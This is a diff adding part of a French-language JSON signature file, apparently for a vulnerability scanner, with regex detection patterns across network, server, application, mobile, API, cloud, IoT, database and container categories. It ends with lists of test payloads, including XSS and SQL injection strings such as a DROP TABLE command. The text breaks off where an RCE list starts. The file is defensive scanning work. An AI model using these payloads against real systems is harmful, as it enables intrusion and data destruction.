+          "severity": "élevé",
+          "category": "network",
+          "patterns": [
+            "arp\\s+spoof",
+            "arp\\s+poisoning",
+            "gratuitous\\s+arp"
+          ],
+          "description": "Détection d'attaques de poisoning ARP"
+        },
+        {
+          "id": "NET-005",
+          "name": "port_scanning",
+          "severity": "moyen",
+          "category": "network",
+          "patterns": [
+            "nmap\\s+scan",
+            "port\\s+scan\\s+detected",
+            "SYN\\s+scan"
+          ],
+          "description": "Détection de scans de ports"
+        },
+        {
+          "id": "NET-006",
+          "name": "vlan_hopping",
+          "severity": "élevé",
+          "category": "network",
+          "patterns": [
+            "vlan\\s+tagging",
+            "802\\.1q",
+            "double\\s+tagging"
+          ],
+          "description": "Attaques de VLAN hopping"
+        },
+        {
+          "id": "NET-007",
+          "name": "telnet_exposure",
+          "severity": "élevé",
+          "category": "network",
+          "patterns": [
+            "23/tcp\\s+open",
+            "telnet\\s+enabled"
+          ],
+          "description": "Exposition de services Telnet"
+        },
+        {
+          "id": "NET-008",
+          "name": "insecure_ftp",
+          "severity": "moyen",
+          "category": "network",
+          "patterns": [
+            "21/tcp\\s+open",
+            "ftp\\s+anonymous",
+            "ftp\\s+login"
+          ],
+          "description": "Services FTP non sécurisés (anonyme)"
+        },
+        {
+          "id": "NET-009",
+          "name": "smb_vulnerabilities",
+          "severity": "élevé",
+          "category": "network",
+          "patterns": [
+            "445/tcp\\s+open",
+            "SMBv1",
+            "ms17-010"
+          ],
+          "description": "Vulnérabilités SMB (par exemple, EternalBlue)"
+        },
+        {
+          "id": "NET-010",
+          "name": "rdp_exposure",
+          "severity": "élevé",
+          "category": "network",
+          "patterns": [
+            "3389/tcp\\s+open",
+            "rdp\\s+enabled"
+          ],
+          "description": "Exposition de services RDP"
+        },
+        {
+          "id": "NET-011",
+          "name": "insecure_dns_config",
+          "severity": "moyen",
+          "category": "network",
+          "patterns": [
+            "53/tcp\\s+open",
+            "dns\\s+recursion",
+            "open\\s+resolver"
+          ],
+          "description": "Configuration DNS non sécurisée (résolveur ouvert)"
+        }
+      ]
+    },
+    "server_vulnerabilities": {
+      "description": "Vulnérabilités serveur",
+      "signatures": [
+        {
+          "id": "SRV-001",
+          "name": "directory_traversal",
+          "severity": "élevé",
+          "category": "path_traversal",
+          "patterns": [
+            "\\.\\./",
+            "\\.\\.\\/",
+            "\\.\\.\\\\/",
+            "%2e%2e%2f",
+            "%2e%2e%5c",
+            "%252e%252e%252f",
+            "/etc/passwd",
+            "(?i)\\\\windows\\\\system32",
+            "file://",
+            "php://filter"
+          ],
+          "description": "Traversée de répertoires"
+        },
+        {
+          "id": "SRV-002",
+          "name": "information_disclosure",
+          "severity": "faible",
+          "category": "information_disclosure",
+          "patterns": [
+            "Server: Apache",
+            "X-Powered-By: PHP",
+            "MySQL Error:",
+            "Warning: mysql_",
+            "Fatal error:",
+            "Stack trace:",
+            "phpinfo()",
+            "\\.git/config",
+            "\\.svn/entries",
+            "web\\.config",
+            "composer.json"
+          ],
+          "description": "Divulgation d'informations"
+        },
+        {
+          "id": "SRV-003",
+          "name": "backup_files",
+          "severity": "moyen",
+          "category": "information_disclosure",
+          "patterns": [
+            "\\.bak",
+            "\\.backup",
+            "\\.old",
+            "\\.orig",
+            "\\.tmp",
+            "\\.swp",
+            "~",
+            "\\.sql",
+            "\\.zip",
+            "\\.tar\\.gz",
+            "\\.7z"
+          ],
+          "description": "Fichiers de sauvegarde exposés"
+        },
+        {
+          "id": "SRV-004",
+          "name": "http_method_misconfiguration",
+          "severity": "moyen",
+          "category": "server",
+          "patterns": [
+            "TRACE\\s+method\\s+enabled",
+            "OPTIONS\\s+method\\s+enabled",
+            "PUT\\s+method\\s+enabled",
+            "DELETE\\s+method\\s+enabled"
+          ],
+          "description": "Mauvaise configuration des méthodes HTTP"
+        },
+        {
+          "id": "SRV-005",
+          "name": "unpatched_server",
+          "severity": "élevé",
+          "category": "server",
+          "patterns": [
+            "Apache/2\\.2\\.",
+            "nginx/0\\.",
+            "IIS/6\\.",
+            "Apache/1\\.3",
+            "nginx/1\\.[0-9]\\."
+          ],
+          "description": "Serveur non patché avec versions vulnérables"
+        },
+        {
+          "id": "SRV-006",
+          "name": "heartbleed_vulnerability",
+          "severity": "critique",
+          "category": "server",
+          "patterns": [
+            "OpenSSL/1\\.0\\.1[\\w-]*",
+            "heartbleed\\s+detected"
+          ],
+          "description": "Vulnérabilité Heartbleed dans OpenSSL"
+        },
+        {
+          "id": "SRV-007",
+          "name": "nginx_misconfiguration",
+          "severity": "moyen",
+          "category": "server",
+          "patterns": [
+            "nginx/.*\\s+misconfig",
+            "autoindex\\s+on",
+            "server_tokens\\s+on"
+          ],
+          "description": "Mauvaise configuration Nginx"
+        },
+        {
+          "id": "SRV-008",
+          "name": "apache_misconfiguration",
+          "severity": "moyen",
+          "category": "server",
+          "patterns": [
+            "Options\\s+Indexes",
+            "AllowOverride\\s+None",
+            "DirectoryIndex\\s+disabled"
+          ],
+          "description": "Mauvaise configuration Apache"
+        },
+        {
+          "id": "SRV-009",
+          "name": "exposed_server_status",
+          "severity": "moyen",
+          "category": "exposure",
+          "patterns": [
+            "/server-status",
+            "/server-info",
+            "mod_status"
+          ],
+          "description": "Exposition des pages de statut du serveur"
+        },
+        {
+          "id": "SRV-010",
+          "name": "insecure_file_permissions",
+          "severity": "élevé",
+          "category": "server",
+          "patterns": [
+            "chmod\\s+777",
+            "chmod\\s+666",
+            "world\\s+writable"
+          ],
+          "description": "Permissions de fichiers non sécurisées"
+        },
+        {
+          "id": "SRV-011",
+          "name": "exposed_cgi_bin",
+          "severity": "élevé",
+          "category": "exposure",
+          "patterns": [
+            "/cgi-bin/",
+            "\\.cgi$",
+            "\\.pl$"
+          ],
+          "description": "Exposition de scripts CGI"
+        },
+        {
+          "id": "SRV-012",
+          "name": "insecure_server_headers",
+          "severity": "moyen",
+          "category": "exposure",
+          "patterns": [
+            "X-Powered-By:.*",
+            "Server:.*",
+            "X-AspNet-Version:.*",
+            "X-AspNetMvc-Version:.*"
+          ],
+          "description": "En-têtes de serveur exposant des informations"
+        }
+      ]
+    },
+    "application_vulnerabilities": {
+      "description": "Vulnérabilités applicatives",
+      "signatures": [
+        {
+          "id": "APP-001",
+          "name": "insecure_deserialization",
+          "severity": "critique",
+          "category": "deserialization",
+          "patterns": [
+            "O:8:\\\"stdClass\\\"",
+            "rO0ABXNyAA",
+            "aced0005",
+            "java\\.lang\\.Runtime",
+            "ProcessBuilder",
+            "ObjectInputStream",
+            "pickle\\.loads",
+            "__reduce__",
+            "yaml.load",
+            "YAML.load"
+          ],
+          "description": "Désérialisation non sécurisée"
+        },
+        {
+          "id": "APP-002",
+          "name": "race_conditions",
+          "severity": "moyen",
+          "category": "concurrency",
+          "patterns": [
+            "TOCTOU",
+            "Time-of-check",
+            "Race condition",
+            "Concurrent access",
+            "Thread unsafe"
+          ],
+          "description": "Conditions de concurrence"
+        },
+        {
+          "id": "APP-003",
+          "name": "buffer_overflow",
+          "severity": "critique",
+          "category": "memory",
+          "patterns": [
+            "AAAAAAAAAAAAAAAA",
+            "\\x90\\x90\\x90\\x90",
+            "shellcode",
+            "stack smashing",
+            "buffer overflow",
+            "heap overflow",
+            "format string"
+          ],
+          "description": "Débordements de tampons"
+        },
+        {
+          "id": "APP-004",
+          "name": "insecure_library",
+          "severity": "élevé",
+          "category": "library",
+          "patterns": [
+            "jquery\\s+v[0-2]\\.",
+            "log4j\\s+v[1-2]\\.",
+            "springframework\\s+v[0-4]\\.",
+            "struts2",
+            "commons-collections"
+          ],
+          "description": "Utilisation de bibliothèques non sécurisées"
+        },
+        {
+          "id": "APP-005",
+          "name": "django_misconfiguration",
+          "severity": "élevé",
+          "category": "framework",
+          "patterns": [
+            "DEBUG=True",
+            "settings\\.py",
+            "django\\.contrib\\.admin",
+            "SECRET_KEY=\\w+"
+          ],
+          "description": "Mauvaise configuration Django"
+        },
+        {
+          "id": "APP-006",
+          "name": "rails_vulnerability",
+          "severity": "élevé",
+          "category": "framework",
+          "patterns": [
+            "rails\\s+v[0-4]\\.",
+            "config\\.secret_key",
+            "strong_parameters\\s+disabled"
+          ],
+          "description": "Vulnérabilités dans Ruby on Rails"
+        },
+        {
+          "id": "APP-007",
+          "name": "input_validation_failure",
+          "severity": "moyen",
+          "category": "validation",
+          "patterns": [
+            "no\\s+validation",
+            "sanitize=disabled",
+            "input\\s+not\\s+filtered"
+          ],
+          "description": "Échec de la validation des entrées"
+        },
+        {
+          "id": "APP-008",
+          "name": "insecure_randomness",
+          "severity": "moyen",
+          "category": "crypto",
+          "patterns": [
+            "rand\\s*\\(",
+            "Math\\.random\\s*\\(",
+            "srand\\s*\\("
+          ],
+          "description": "Génération de nombres aléatoires non sécurisée"
+        },
+        {
+          "id": "APP-009",
+          "name": "log4j_vulnerability",
+          "severity": "critique",
+          "category": "library",
+          "patterns": [
+            "log4j\\s+v2\\.[0-16]\\.",
+            "JndiLookup",
+            "\\${jndi:",
+            "\\${lower:",
+            "\\${env:"
+          ],
+          "description": "Vulnérabilité Log4Shell dans Log4j"
+        },
+        {
+          "id": "APP-010",
+          "name": "insecure_session_storage",
+          "severity": "moyen",
+          "category": "storage",
+          "patterns": [
+            "localStorage\\s*\\.",
+            "sessionStorage\\s*\\."
+          ],
+          "description": "Stockage de sessions non sécurisé"
+        },
+        {
+          "id": "APP-011",
+          "name": "unvalidated_redirects",
+          "severity": "moyen",
+          "category": "redirection",
+          "patterns": [
+            "redirect_to=.*",
+            "goto=.*",
+            "next=.*"
+          ],
+          "description": "Redirections non validées dans l'application"
+        },
+        {
+          "id": "APP-012",
+          "name": "insecure_crypto",
+          "severity": "élevé",
+          "category": "crypto",
+          "patterns": [
+            "MD5\\s*\\(",
+            "SHA1\\s*\\(",
+            "DES\\s*\\(",
+            "RC4"
+          ],
+          "description": "Utilisation d'algorithmes cryptographiques obsolètes"
+        }
+      ]
+    },
+    "mobile_vulnerabilities": {
+      "description": "Vulnérabilités mobiles",
+      "signatures": [
+        {
+          "id": "MOB-001",
+          "name": "insecure_storage",
+          "severity": "moyen",
+          "category": "mobile",
+          "patterns": [
+            "SharedPreferences",
+            "NSUserDefaults",
+            "sqlite",
+            "realm",
+            "keychain",
+            "internal storage",
+            "external storage"
+          ],
+          "description": "Stockage non sécurisé"
+        },
+        {
+          "id": "MOB-002",
+          "name": "certificate_pinning_bypass",
+          "severity": "élevé",
+          "category": "mobile",
+          "patterns": [
+            "SSLKillSwitch",
+            "SSL Kill Switch",
+            "certificate pinning",
+            "TrustManager",
+            "checkServerTrusted",
+            "allowAllHostnameVerifier"
+          ],
+          "description": "Contournement du certificate pinning"
+        },
+        {
+          "id": "MOB-003",
+          "name": "insecure_communication",
+          "severity": "élevé",
+          "category": "mobile",
+          "patterns": [
+            "http://",
+            "cleartext\\s+traffic",
+            "unencrypted\\s+connection"
+          ],
+          "description": "Communications non chiffrées dans les applications mobiles"
+        },
+        {
+          "id": "MOB-004",
+          "name": "intent_spoofing",
+          "severity": "moyen",
+          "category": "mobile",
+          "patterns": [
+            "android\\.intent\\.",
+            "startActivity\\s*\\(",
+            "sendBroadcast\\s*\\("
+          ],
+          "description": "Attaques de spoofing d'intents Android"
+        },
+        {
+          "id": "MOB-005",
+          "name": "insecure_permissions",
+          "severity": "élevé",
+          "category": "mobile",
+          "patterns": [
+            "android:exported=true",
+            "permission=.*WRITE",
+            "permission=.*READ"
+          ],
+          "description": "Permissions non sécurisées dans l'application"
+        },
+        {
+          "id": "MOB-006",
+          "name": "exposed_components",
+          "severity": "élevé",
+          "category": "mobile",
+          "patterns": [
+            "exported=.*true",
+            "activity\\s+exported",
+            "service\\s+exported"
+          ],
+          "description": "Composants exposés dans l'application"
+        },
+        {
+          "id": "MOB-007",
+          "name": "insecure_backup",
+          "severity": "moyen",
+          "category": "mobile",
+          "patterns": [
+            "android:allowBackup=true",
+            "backup=true"
+          ],
+          "description": "Sauvegardes non sécurisées dans l'application"
+        }
+      ]
+    },
+    "api_vulnerabilities": {
+      "description": "Vulnérabilités API",
+      "signatures": [
+        {
+          "id": "API-001",
+          "name": "broken_authentication",
+          "severity": "élevé",
+          "category": "api",
+          "patterns": [
+            "Authorization: Bearer ",
+            "api_key=",
+            "access_token=",
+            "X-API-KEY:",
+            "no authentication",
+            "weak token"
+          ],
+          "description": "Authentification API cassée"
+        },
+        {
+          "id": "API-002",
+          "name": "excessive_data_exposure",
+          "severity": "moyen",
+          "category": "api",
+          "patterns": [
+            "password",
+            "secret",
+            "private_key",
+            "ssn",
+            "credit_card",
+            "personal data",
+            "sensitive information"
+          ],
+          "description": "Exposition excessive de données"
+        },
+        {
+          "id": "API-003",
+          "name": "rate_limiting_issues",
+          "severity": "faible",
+          "category": "api",
+          "patterns": [
+            "no rate limit",
+            "unlimited requests",
+            "429 Too Many Requests",
+            "X-RateLimit-Limit",
+            "X-RateLimit-Remaining"
+          ],
+          "description": "Problèmes de limitation de débit"
+        },
+        {
+          "id": "API-004",
+          "name": "graphql_injection",
+          "severity": "élevé",
+          "category": "api",
+          "patterns": [
+            "\\{__schema",
+            "query\\s*\\{",
+            "mutation\\s*\\{",
+            "introspection\\s+query",
+            "\\{__type\\(",
+            "__typename",
+            "fragment"
+          ],
+          "description": "Détection d'injections GraphQL"
+        },
+        {
+          "id": "API-005",
+          "name": "api_key_leakage",
+          "severity": "élevé",
+          "category": "api",
+          "patterns": [
+            "api_key=\\w+",
+            "secret_key=\\w+",
+            "token=\\w+"
+          ],
+          "description": "Fuite de clés API"
+        },
+        {
+          "id": "API-006",
+          "name": "broken_object_level_auth",
+          "severity": "élevé",
+          "category": "api",
+          "patterns": [
+            "/api/v\\d+/users/\\d+",
+            "/api/v\\d+/resources/\\d+"
+          ],
+          "description": "Autorisation de niveau objet cassée"
+        },
+        {
+          "id": "API-007",
+          "name": "insecure_api_versioning",
+          "severity": "moyen",
+          "category": "api",
+          "patterns": [
+            "/api/v1/",
+            "/api/v0/",
+            "version=1"
+          ],
+          "description": "Versionnement API non sécurisé"
+        },
+        {
+          "id": "API-008",
+          "name": "exposed_api_endpoints",
+          "severity": "moyen",
+          "category": "api",
+          "patterns": [
+            "/api/v\\d+/public/",
+            "/api/v\\d+/admin/"
+          ],
+          "description": "Points de terminaison API exposés"
+        },
+        {
+          "id": "API-009",
+          "name": "insecure_data_validation",
+          "severity": "moyen",
+          "category": "api",
+          "patterns": [
+            "no\\s+validation",
+            "sanitize=disabled",
+            "input\\s+not\\s+filtered"
+          ],
+          "description": "Validation de données non sécurisée dans les API"
+        },
+        {
+          "id": "API-010",
+          "name": "api_dos",
+          "severity": "élevé",
+          "category": "api",
+          "patterns": [
+            "requests_per_second=\\d+",
+            "dos\\s+detected",
+            "too\\s+many\\s+requests"
+          ],
+          "description": "Attaques de déni de service sur les API"
+        },
+        {
+          "id": "API-011",
+          "name": "insecure_cors_api",
+          "severity": "moyen",
+          "category": "api",
+          "patterns": [
+            "Access-Control-Allow-Origin: \\*",
+            "Access-Control-Allow-Methods: \\*"
+          ],
+          "description": "Configuration CORS non sécurisée pour les API"
+        },
+        {
+          "id": "API-012",
+          "name": "graphql_introspection",
+          "severity": "moyen",
+          "category": "api",
+          "patterns": [
+            "__schema",
+            "__type",
+            "introspection"
+          ],
+          "description": "Exposition d'introspection GraphQL"
+        },
+        {
+          "id": "API-013",
+          "name": "insecure_api_auth",
+          "severity": "élevé",
+          "category": "api",
+          "patterns": [
+            "no-auth",
+            "basic_auth=disabled",
+            "oauth=disabled"
+          ],
+          "description": "Authentification API absente ou faible"
+        },
+        {
+          "id": "API-014",
+          "name": "graphql_batching",
+          "severity": "moyen",
+          "category": "api",
+          "patterns": [
+            "\\[\\{.*\\},\\{.*\\}\\]",
+            "batchQuery",
+            "batch"
+          ],
+          "description": "Attaques par batching GraphQL (DoS)"
+        },
+        {
+          "id": "API-015",
+          "name": "api_version_enumeration",
+          "severity": "moyen",
+          "category": "api",
+          "patterns": [
+            "/api/v\\d+/",
+            "/api/version",
+            "/v\\d+/"
+          ],
+          "description": "Énumération de versions API"
+        }
+      ]
+    },
+    "cloud_vulnerabilities": {
+      "description": "Vulnérabilités cloud",
+      "signatures": [
+        {
+          "id": "CLD-001",
+          "name": "misconfigured_s3_buckets",
+          "severity": "élevé",
+          "category": "cloud",
+          "patterns": [
+            "s3://",
+            "amazonaws.com",
+            "public-read",
+            "public-read-write",
+            "AllUsers",
+            "AuthenticatedUsers"
+          ],
+          "description": "Buckets S3 mal configurés"
+        },
+        {
+          "id": "CLD-002",
+          "name": "exposed_cloud_metadata",
+          "severity": "moyen",
+          "category": "cloud",
+          "patterns": [
+            "169.254.169.254",
+            "/latest/meta-data/",
+            "/computeMetadata/v1/",
+            "Azure Instance Metadata",
+            "GCP metadata"
+          ],
+          "description": "Métadonnées cloud exposées"
+        },
+        {
+          "id": "CLD-003",
+          "name": "iam_misconfiguration",
+          "severity": "élevé",
+          "category": "cloud",
+          "patterns": [
+            "iam:.*\\*",
+            "policy:.*\\*",
+            "arn:aws:iam::.*:root"
+          ],
+          "description": "Mauvaise configuration des permissions IAM"
+        },
+        {
+          "id": "CLD-004",
+          "name": "exposed_storage_account",
+          "severity": "élevé",
+          "category": "cloud",
+          "patterns": [
+            "blob\\.core\\.windows\\.net",
+            "storageaccount=\\w+",
+            "sas_token=\\w+"
+          ],
+          "description": "Comptes de stockage cloud exposés"
+        },
+        {
+          "id": "CLD-005",
+          "name": "insecure_lambda_config",
+          "severity": "moyen",
+          "category": "cloud",
+          "patterns": [
+            "lambda:.*\\*",
+            "FunctionName=\\w+",
+            "public\\s+lambda"
+          ],
+          "description": "Configuration non sécurisée des fonctions Lambda"
+        },
+        {
+          "id": "CLD-006",
+          "name": "exposed_cloud_credentials",
+          "severity": "critique",
+          "category": "cloud",
+          "patterns": [
+            "AWS_ACCESS_KEY_ID=\\w+",
+            "AWS_SECRET_ACCESS_KEY=\\w+",
+            "aws_access_key=\\w+"
+          ],
+          "description": "Exposition d'identifiants cloud"
+        },
+        {
+          "id": "CLD-007",
+          "name": "insecure_vpc_config",
+          "severity": "moyen",
+          "category": "cloud",
+          "patterns": [
+            "0.0.0.0/0",
+            "public\\s+subnet",
+            "default\\s+vpc"
+          ],
+          "description": "Configuration VPC non sécurisée"
+        },
+        {
+          "id": "CLD-008",
+          "name": "exposed_cloud_api",
+          "severity": "élevé",
+          "category": "cloud",
+          "patterns": [
+            "api\\.gateway\\..*",
+            "cloudfront\\..*",
+            "/api/v\\d+/cloud/"
+          ],
+          "description": "Exposition d'API cloud"
+        },
+        {
+          "id": "CLD-009",
+          "name": "insecure_kms_key",
+          "severity": "élevé",
+          "category": "cloud",
+          "patterns": [
+            "kms:.*\\*",
+            "key_id=\\w+",
+            "encryption_key=\\w+"
+          ],
+          "description": "Clés KMS non sécurisées"
+        },
+        {
+          "id": "CLD-010",
+          "name": "cloudtrail_disabled",
+          "severity": "moyen",
+          "category": "cloud",
+          "patterns": [
+            "cloudtrail=disabled",
+            "no\\s+logging",
+            "trail=off"
+          ],
+          "description": "CloudTrail désactivé ou mal configuré"
+        },
+        {
+          "id": "CLD-011",
+          "name": "cloud_metadata_ssrf",
+          "severity": "élevé",
+          "category": "cloud",
+          "patterns": [
+            "http://169.254.169.254",
+            "http://metadata.google.internal",
+            "http://100.100.100.200"
+          ],
+          "description": "SSRF vers les métadonnées cloud"
+        }
+      ]
+    },
+    "iot_vulnerabilities": {
+      "description": "Vulnérabilités IoT",
+      "signatures": [
+        {
+          "id": "IOT-001",
+          "name": "default_iot_credentials",
+          "severity": "critique",
+          "category": "iot",
+          "patterns": [
+            "admin:admin",
+            "root:",
+            "admin:",
+            "user:user",
+            "pi:raspberry",
+            "ubnt:ubnt",
+            "cisco:cisco"
+          ],
+          "description": "Identifiants IoT par défaut"
+        },
+        {
+          "id": "IOT-002",
+          "name": "insecure_firmware",
+          "severity": "élevé",
+          "category": "iot",
+          "patterns": [
+            "firmware update",
+            "bootloader",
+            "UART",
+            "JTAG",
+            "hardcoded key",
+            "backdoor"
+          ],
+          "description": "Firmware non sécurisé"
+        },
+        {
+          "id": "IOT-003",
+          "name": "mqtt_exposure",
+          "severity": "élevé",
+          "category": "iot",
+          "patterns": [
+            "1883/tcp\\s+open",
+            "mqtt://",
+            "publish\\s+.*\\s+topic"
+          ],
+          "description": "Exposition de services MQTT"
+        },
+        {
+          "id": "IOT-004",
+          "name": "telnet_iot_exposure",
+          "severity": "élevé",
+          "category": "iot",
+          "patterns": [
+            "23/tcp\\s+open",
+            "telnet\\s+enabled"
+          ],
+          "description": "Exposition de Telnet sur dispositifs IoT"
+        },
+        {
+          "id": "IOT-005",
+          "name": "insecure_iot_protocol",
+          "severity": "moyen",
+          "category": "iot",
+          "patterns": [
+            "coap://",
+            "http://.*iot",
+            "unencrypted\\s+iot"
+          ],
+          "description": "Protocoles IoT non sécurisés"
+        },
+        {
+          "id": "IOT-006",
+          "name": "exposed_iot_api",
+          "severity": "élevé",
+          "category": "iot",
+          "patterns": [
+            "/api/v\\d+/iot/",
+            "iot_endpoint=\\w+"
+          ],
+          "description": "API IoT exposées"
+        },
+        {
+          "id": "IOT-007",
+          "name": "insecure_iot_auth",
+          "severity": "élevé",
+          "category": "iot",
+          "patterns": [
+            "no-auth\\s+iot",
+            "iot_token=\\w+",
+            "iot_key=\\w+"
+          ],
+          "description": "Authentification IoT non sécurisée"
+        },
+        {
+          "id": "IOT-008",
+          "name": "iot_hardcoded_credentials",
+          "severity": "critique",
+          "category": "iot",
+          "patterns": [
+            "iot_user=\\w+",
+            "iot_pass=\\w+",
+            "hardcoded\\s+iot"
+          ],
+          "description": "Identifiants codés en dur dans les dispositifs IoT"
+        },
+        {
+          "id": "IOT-009",
+          "name": "iot_unencrypted_comms",
+          "severity": "élevé",
+          "category": "iot",
+          "patterns": [
+            "http://.*iot",
+            "cleartext\\s+iot",
+            "no\\s+encryption"
+          ],
+          "description": "Communications IoT non chiffrées"
+        },
+        {
+          "id": "IOT-010",
+          "name": "iot_exposed_ports",
+          "severity": "élevé",
+          "category": "iot",
+          "patterns": [
+            "80/tcp\\s+open\\s+iot",
+            "443/tcp\\s+open\\s+iot",
+            "8080/tcp\\s+open"
+          ],
+          "description": "Ports exposés sur dispositifs IoT"
+        }
+      ]
+    },
+    "database_vulnerabilities": {
+      "description": "Vulnérabilités des bases de données",
+      "signatures": [
+        {
+          "id": "DB-001",
+          "name": "nosql_injection",
+          "severity": "élevé",
+          "category": "injection",
+          "patterns": [
+            "\\$where:",
+            "\\$ne:",
+            "\\$gt:",
+            "\\$lt:",
+            "\\$regex:",
+            "function\\s*\\(",
+            "\\{.*\\$ne.*\\}"
+          ],
+          "description": "Détection d'injections NoSQL"
+        },
+        {
+          "id": "DB-002",
+          "name": "database_exposure",
+          "severity": "critique",
+          "category": "exposure",
+          "patterns": [
+            "mongodb://",
+            "redis://",
+            "couchdb://",
+            "port\\s+27017",
+            "port\\s+6379"
+          ],
+          "description": "Exposition de bases de données non sécurisées"
+        },
+        {
+          "id": "DB-003",
+          "name": "mysql_misconfiguration",
+          "severity": "élevé",
+          "category": "configuration",
+          "patterns": [
+            "mysql\\s+root\\s+password",
+            "bind-address=0\\.0\\.0\\.0",
+            "port\\s+3306\\s+open"
+          ],
+          "description": "Mauvaise configuration MySQL"
+        },
+        {
+          "id": "DB-004",
+          "name": "postgresql_exposure",
+          "severity": "élevé",
+          "category": "exposure",
+          "patterns": [
+            "5432/tcp\\s+open",
+            "postgresql://",
+            "pg_hba\\.conf"
+          ],
+          "description": "Exposition de bases de données PostgreSQL"
+        },
+        {
+          "id": "DB-005",
+          "name": "oracle_exposure",
+          "severity": "élevé",
+          "category": "exposure",
+          "patterns": [
+            "1521/tcp\\s+open",
+            "oracle://",
+            "tnsnames\\.ora"
+          ],
+          "description": "Exposition de bases de données Oracle"
+        },
+        {
+          "id": "DB-006",
+          "name": "redis_misconfiguration",
+          "severity": "élevé",
+          "category": "configuration",
+          "patterns": [
+            "6379/tcp\\s+open",
+            "requirepass\\s+none",
+            "redis\\s+no\\s+auth"
+          ],
+          "description": "Mauvaise configuration Redis"
+        },
+        {
+          "id": "DB-007",
+          "name": "mongodb_misconfiguration",
+          "severity": "élevé",
+          "category": "configuration",
+          "patterns": [
+            "27017/tcp\\s+open",
+            "bind_ip=0\\.0\\.0\\.0",
+            "auth=false"
+          ],
+          "description": "Mauvaise configuration MongoDB"
+        },
+        {
+          "id": "DB-008",
+          "name": "couchdb_exposure",
+          "severity": "élevé",
+          "category": "exposure",
+          "patterns": [
+            "5984/tcp\\s+open",
+            "couchdb://",
+            "admin\\s+party"
+          ],
+          "description": "Exposition de bases de données CouchDB"
+        },
+        {
+          "id": "DB-009",
+          "name": "sql_server_exposure",
+          "severity": "élevé",
+          "category": "exposure",
+          "patterns": [
+            "1433/tcp\\s+open",
+            "mssql://",
+            "sa\\s+password"
+          ],
+          "description": "Exposition de bases de données SQL Server"
+        },
+        {
+          "id": "DB-010",
+          "name": "insecure_db_credentials",
+          "severity": "critique",
+          "category": "exposure",
+          "patterns": [
+            "db_user=\\w+",
+            "db_pass=\\w+",
+            "database_password=\\w+"
+          ],
+          "description": "Identifiants de base de données exposés"
+        },
+        {
+          "id": "DB-011",
+          "name": "db_backup_exposure",
+          "severity": "élevé",
+          "category": "exposure",
+          "patterns": [
+            "\\.sql\\.bak",
+            "\\.sql\\.gz",
+            "backup\\.sql"
+          ],
+          "description": "Exposition de fichiers de sauvegarde de bases de données"
+        },
+        {
+          "id": "DB-012",
+          "name": "insecure_db_port",
+          "severity": "élevé",
+          "category": "exposure",
+          "patterns": [
+            "3306/tcp\\s+open",
+            "5432/tcp\\s+open",
+            "1433/tcp\\s+open"
+          ],
+          "description": "Ports de bases de données exposés"
+        }
+      ]
+    },
+    "container_vulnerabilities": {
+      "description": "Vulnérabilités des conteneurs",
+      "signatures": [
+        {
+          "id": "CONT-001",
+          "name": "docker_misconfiguration",
+          "severity": "élevé",
+          "category": "container",
+          "patterns": [
+            "docker\\s+--privileged",
+            "docker\\s+--net=host",
+            "/var/run/docker\\.sock",
+            "docker-compose\\.yml"
+          ],
+          "description": "Mauvaise configuration des conteneurs Docker"
+        },
+        {
+          "id": "CONT-002",
+          "name": "kubernetes_exposure",
+          "severity": "élevé",
+          "category": "container",
+          "patterns": [
+            "kubectl\\s+get\\s+pods",
+            "apiVersion:\\s+v1",
+            "kind:\\s+Pod",
+            "serviceAccount:\\s+default"
+          ],
+          "description": "Exposition de configurations Kubernetes"
+        },
+        {
+          "id": "CONT-003",
+          "name": "insecure_container_image",
+          "severity": "élevé",
+          "category": "container",
+          "patterns": [
+            "image:.*:latest",
+            "image:.*alpine",
+            "image:.*unverified"
+          ],
+          "description": "Images de conteneurs non sécurisées"
+        },
+        {
+          "id": "CONT-004",
+          "name": "rbac_misconfiguration",
+          "severity": "élevé",
+          "category": "container",
+          "patterns": [
+            "clusterrole:.*\\*",
+            "rolebinding:.*admin",
+            "serviceaccount:.*default"
+          ],
+          "description": "Mauvaise configuration RBAC dans Kubernetes"
+        },
+        {
+          "id": "CONT-005",
+          "name": "exposed_docker_api",
+          "severity": "critique",
+          "category": "container",
+          "patterns": [
+            "2375/tcp\\s+open",
+            "2376/tcp\\s+open",
+            "docker\\s+api"
+          ],
+          "description": "API Docker exposée"
+        },
+        {
+          "id": "CONT-006",
+          "name": "insecure_kube_config",
+          "severity": "élevé",
+          "category": "container",
+          "patterns": [
+            "\\.kube/config",
+            "kubectl\\s+config",
+            "kubeconfig=\\w+"
+          ],
+          "description": "Configuration Kubernetes non sécurisée"
+        },
+        {
+          "id": "CONT-007",
+          "name": "container_escape",
+          "severity": "critique",
+          "category": "container",
+          "patterns": [
+            "cap_sys_admin",
+            "privileged=true",
+            "hostPID=true"
+          ],
+          "description": "Tentatives d'évasion de conteneur"
+        },
+        {
+          "id": "CONT-008",
+          "name": "insecure_docker_registry",
+          "severity": "élevé",
+          "category": "container",
+          "patterns": [
+            "registry:.*http://",
+            "insecure-registry",
+            "registry:.*:5000"
+          ],
+          "description": "Registre Docker non sécurisé"
+        },
+        {
+          "id": "CONT-009",
+          "name": "exposed_kube_dashboard",
+          "severity": "élevé",
+          "category": "container",
+          "patterns": [
+            "/api/v\\d+/dashboard",
+            "kubernetes-dashboard",
+            "8080/tcp\\s+open"
+          ],
+          "description": "Tableau de bord Kubernetes exposé"
+        },
+        {
+          "id": "CONT-010",
+          "name": "insecure_container_network",
+          "severity": "moyen",
+          "category": "container",
+          "patterns": [
+            "network=host",
+            "bridge\\s+network",
+            "open\\s+network"
+          ],
+          "description": "Configuration réseau de conteneur non sécurisée"
+        }
+      ]
+    }
+  },
+  "detection_rules": {
+    "http_methods": ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"],
+    "common_files": [
+      "/robots.txt",
+      "/sitemap.xml",
+      "/\\.htaccess",
+      "/web\\.config",
+      "/crossdomain.xml",
+      "/favicon.ico",
+      "/.well-known/",
+      "/security.txt"
+    ],
+    "sensitive_extensions": [".php", ".asp", ".aspx", ".jsp", ".cgi", ".pl", ".py", ".rb", ".go"],
+    "payloads": {
+      "xss": [
+        "<script>alert('XSS')</script>",
+        "javascript:alert('XSS')",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg onload=alert('XSS')>",
+        "<body onload=alert('XSS')>",
+        "<input onfocus=alert('XSS') autofocus>"
+      ],
+      "sql": [
+        "' OR '1'='1' --",
+        "'; DROP TABLE users; --",
+        "' UNION SELECT null,null,null --",
+        "admin'/**/OR/**/'1'='1",
+        "1' AND SLEEP(5) AND '1'='1",
+        "1' WAITFOR DELAY '00:00:05' --"
+      ],
+      "rce": [
